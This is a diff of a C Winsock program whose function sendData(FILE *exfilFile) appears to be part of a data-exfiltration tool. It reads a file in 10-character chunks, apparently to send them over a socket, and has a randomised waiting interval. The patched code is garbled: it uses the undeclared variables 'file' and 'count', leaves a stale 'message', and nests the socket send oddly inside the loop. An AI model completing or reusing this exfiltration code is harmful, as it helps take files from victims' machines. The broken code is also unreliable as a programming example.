@@ -10,7 +10,6 @@
 // Library for implementing the "random" number
 #include <time.h>
 
-// TODO: Add Library in Linking Process (-lws2_32)
 #pragma comment(lib, "ws2_32.lib") 
 
 // Define the range of the waiting time in miliseconds
@@ -90,12 +89,22 @@ int sendData(FILE *exfilFile){
 	char buffer[11];
 	int charCount = 0;
 
-	while(1) {
-		int c = fgetc(exfilFile);
+    while (1) {
+        int c = fgetc(file); // Read one character
+        if (c == EOF) {
+            if (count > 0) { // If there are remaining characters in the buffer
+                buffer[count] = '\0'; // Null-terminate the string
+                printf("%s", buffer); // Print the last chunk
+            }
+            break; // End of file reached
+        }
 
-	}
+        buffer[count++] = (char)c; // Store the character in the buffer
 
-	message = "Test Message";
+        if (count == 10) {
+            buffer[count] = '\0'; // Null-terminate the string
+            printf("%s", buffer); // Print the buffer
+
 
 	if( send(socket, message, strlen(message) , 0) < 0)
 	{
@@ -104,6 +113,11 @@ int sendData(FILE *exfilFile){
 	}
 	printf("Data sent");
 
+
+
+            count = 0; // Reset the counter
+        }
+    }
 	WSACleanup();
 
 	return 0;
